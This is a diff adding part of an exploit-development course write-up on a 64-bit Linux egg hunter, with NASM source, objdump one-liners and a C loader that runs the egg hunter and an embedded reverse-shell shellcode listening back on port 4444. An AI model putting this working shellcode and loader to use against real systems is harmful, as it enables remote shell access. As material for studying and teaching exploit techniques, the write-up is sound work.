@@ -63,16 +63,208 @@ while (remain memory pages to check){
   } 
 } 
 ```
+The memory page size is usually 4096 bytes (hex value of: 0x1000). This value is required to know in the Egg Hunter how many memory positions to search for each page. To check this value, the following code in C will show the size of the pages:
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+int main()
+{
+        int size = getpagesize();
+        printf("\nPage size on this system is %i bytes\n", size);
+        return 0;
+}
+```
 ### ASM Implementation
 ---
+Following is taken into consideration during the implementation:
 
+- The value for the "egg" is **"kaki"**. This can be easily changed in the code. 
+- RDX will point to the memory address to check:
+  - It's used to check each memory position of for a page in the search of the "egg" in that page. It's value increments by "1" to check each memory position until it finds the "egg" or reaches the end of the page.
+  - The register also can be used to reference the memory page. For that, the code makes RDX to point at the first byte of each page. This is done by OR'ing the RDX value with 0x1000 (page size), that will always point to the first byte of the next page to check.
+    - As the value 0x1000 will place NULLs in the codee for the `or` instruction, the trick is to first `or rdx, 0x0FFF` (4095 in dec) and then `inc rdx`. This gives same results but without NULLs.
+- RDI stores the memory position that is being checked plus 8 bytes, that is where the shellcode will be if the "egg" is found in the RDX memory position. As the "egg" is only 4 bytes, and per the comments before, the "egg" has to be found twice, the total size of the "egg"x2 is 8 bytes. After the "eggs", the shellcode starts.
+- The `access()` call requires two parameters:
+  - RDI: The memory position for `access()` to check if its mapped to the process and hence accesible by it
+  - RSI: Value will be **F_OK**
+- While a memory page mapped for the process is not found, a bucle will be incrementing the value of RDX by 0x1000 (page size) until `access()` finds that the page is accessible. From here, RDX is used to check each memory position in the page for the "egg".
+- Once the "egg" is found, have to check the next 4 bytes to see if also they contain the "egg". If both "eggs" been found, then the code jumps to memory position where the found shellcode is to run it. RDI is pointing to this memory position as per the explanation before. Also doing this, we can use any value for the "egg", not requiring it to be opcodes for real ASM instructions
 
+The following code implements the Egg Hunter Shellcode. The code does not remove NULLs at this time, it will be done later.
+```asm
+global _start
+section .text
 
+EGG equ 'kaki'
 
+_start:
 
+	xor rdx, rdx
 
+next_mem_page:
 
+	or dx, 0xfff		        ; 0xfff == 4095. To jump next page
 
+next_mem_position:
+
+	inc rdx			            ; Two uses: 
+      				            ; 	1) Next memory position when checking memory positions into a page
+			                  	;	2) Place pointer at the first byte of a memory page
+	lea rdi, [rdx + 8]	    ; Stores memory position after the "eggs" 
+
+	mov rax, 0x15		        ; Syscall number for access()
+	xor rsi, rsi
+	syscall		            	; Test if mem position is accessible
+				                  ;   RDI -> Address to check
+				                  ;   RSI -> 0
+	cmp rax, 0xf2		        ; EFAULT?
+	jz next_mem_page	      ; Yes, then check next page
+
+	mov rax, EGG	        	; Page accessible, let's check if we find the egg
+	mov rdi, rdx	        	; Put in RDI the memory position to check if has the egg 
+	scasd			              ; We compare. scasd increments RDI
+	jnz next_mem_position	  ; Not found the egg, jump to next memory position in the page
+	scasd			              ; Found 4 bytes of the egg, let's check if next 4 byte also have the egg
+	jnz next_mem_position	  ; Not found second egg, jump again to check next memory position
+	
+	jmp rdi			            ; EGG found. Jump to execute it's shellcode. 
+				                  ; The RDI already pointing to the start of the shellcode due scasd increments
+```
+#### NULLs Off and Shellcode Size
+For the ASM code, it's time now to remove the NULLs and try to reduce it's shellcode size as much as possible. The process will be the same one done in previous assignments:
+- Use `objdump -M intel -d EggHunter.o` to review NULLs and opcodes
+- Replace instructions with ones that do the same but that do not add NULLs
+- Replace instructions, if possible, by ones using less bytes in the opcodes
+- Hardcode the EGG value in the code
+
+The code ends up like this. This time has not been reduced too much:
+```asm
+global _start
+section .text
+_start:
+
+	xor rdx, rdx		      ; Pointer to memory positions
+
+next_mem_page:
+
+	or dx, 0xfff		      ; 0xfff == 4095. To jump next page
+
+next_mem_position:
+
+	inc rdx					      ; Two uses: 
+							          ; 	1) Next memory position when checking memory positions into a page
+							          ;	2) Place pointer at the first byte of a memory page
+	lea rdi, [rdx + 8]		; Shellcode position
+
+	;mov rax, 0x15			  ; Syscall number for access()
+	push 21
+	pop rax
+	xor rsi, rsi
+	syscall					      ; Test if memory position is accessible
+							          ;   RDI -> Address to check
+							          ;   RSI -> 0
+	cmp al, 0xf2			    ; EFAULT?
+	jz next_mem_page		  ; Yes, then check next page
+
+	;mov rax, EGG			    ; Page accessible, let's check if we find the egg
+	push "kaki"				    ; This is the egg value. 4 bytes. Change here
+	pop rax
+
+	;mov rdi, rdx			    ; Put in RDI the memory position to check if has the egg 
+	push rdx
+	pop rdi
+
+	scasd					        ; We compare. scasd increments RDI
+	jnz next_mem_position	; Not found the egg, jump to next memory position in the page
+	scasd					        ; Found 4 bytes of the egg, let's check if next 4 byte also have the egg
+	jnz next_mem_position	; Not found second egg, jump again to check next memory position
+	
+	jmp rdi					      ; EGG found. Jump to execute it's shellcode. 
+							          ; The RDI already pointing to the start of the shellcode due scasd increments
+```
+### The PoC Code
+---
+For the demo of the Egg Hunter Technique, the `shellcode.c` template is used. Just some extra information is going to be printed this time:
+- Length of the Egg Hunter Shellcode
+- Length of the shellcode to find and execute
+- Memory positions for both Shellcodes
+With this information, memory positions where the shellcodes are is known. This will be usefull in the next steps.
+
+Now, the shellcode for the Egg Hunter is generated with one liner `objdump`:
+```markdown
+SLAE64> echo “\"$(objdump -d EggHunterV2.o | grep '[0-9a-f]:' | 
+              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
+
+"\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x6a\x15\x58\x48\x31\xf6\x0f
+\x05\x3c\xf2\x74\xe8\x68\x6b\x61\x6b\x69\x58\x52\x5f\xaf\x75\xe2\xaf\x75\xdf\xff\xe7"
+
+SLAE64> 
+```
+Also, the shellcode that is used is the one from the [Assignment #2](https://galminyana.github.io/Assignment02):
+```markdown
+SLAE64> nasm -f elf64 ReverseShell-ExecveStack_V2.nasm -o ReverseShell-ExecveStack_V2.o
+SLAE64> echo “\"$(objdump -d ReverseShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
+              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
+              
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66
+\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21
+\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20
+\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31
+\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f
+\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05"
+
+SLAE64> 
+```
+Both shellcodes are populated into the `shellcode.c` template:
+```c
+#include <stdio.h>
+#include <string.h>
+
+//#define EGG	"\x90\x50\x90\x50"
+#define EGG	"kaki"
+
+unsigned char egg_hunter[] = \
+"\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x6a\x15\x58\x48\x31\xf6\x0f\x05\x3c\xf2\x74\xe8\x68\x6b\x61\x6b\x69\x58\x52\x5f\xaf\x75\xe2\xaf\x75\xdf\xff\xe7";
+
+unsigned char code[]= EGG EGG \
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";
+
+void main()
+{
+	printf("ShellCode Lenght + Eggs: %d\n", strlen(code));
+	printf("Shellcode at position: %p\n", code);
+	printf("Egg Hunter ShellCode Size: %d\n", strlen(egg_hunter));
+	printf("Egg Hunter Shellcode at position: %p\n", egg_hunter);
+
+	int (*ret)() = (int(*)())egg_hunter;
+	ret();
+}
+```
+#### Compiling and Run
+When the program was compiled with the `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` command, and run, it will take too long to find the shellcode. This is because the Hunter code, will start from the 1st lower memory position, and the program will be far from there. 
+Just for the POC, we can compile with gcc forcing the .text sextion to be in low memory positions to make the find process easier. This is done with the following gcc options:
+```markup
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode -Wl,-Ttext-segment,0x20000000
+```
+Once compiled with this options, the "egg" is found quickly. To test it, a `netcat` listener on port 4444 is needed on one terminal, and in the other terminal, `./shellcode` is executed. Everything works great, spawning a shell:
+
+<img src="https://galminyana.github.io/img/A03_POC_Results.png" width="75%" height="75%">
+
+#### Setting the POC for any shellcode
+
+If another shellcode has to be tested, just need to replace the shellcode in `code[]` string in the `shellcode.c` and compile.
+In case that another "egg" value has to be used, also needs to be replaced in the `EGG` defined in the `shellcode.c` and also in the ASM code where it is hardcoded (it's commented in the code).
+
+### GitHub Repo Files
+---
+The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment03) for this assignment contains the following files:
+
+- [EggHunter.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment03/EggHunter.nasm) : This is the ASM source code for the first version of the Egg Hunter. It's with NULLs and not caring on the shellcode size, but is more clear to understand the code.
+- [EggHunterV2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment03/EggHunterV2.nasm) : This is the NULL free code for the Egg Hunter.
+- [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment03/ReverseShell-ExecveStack_V2.nasm) : This is the NULL free code for the Egg Hunter.
+- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment03/shellcode.c) : The C template with the V2 of the Egg Hunter Shellcode and ReverseShell Shellcode, ready to compile and execute
+- [pagesize.c](https://github.com/galminyana/SLAE64/blob/main/Assignment03/pagesize.c) : A C program that just prints the size of memory pages in the system
 
 ### The End
 ---
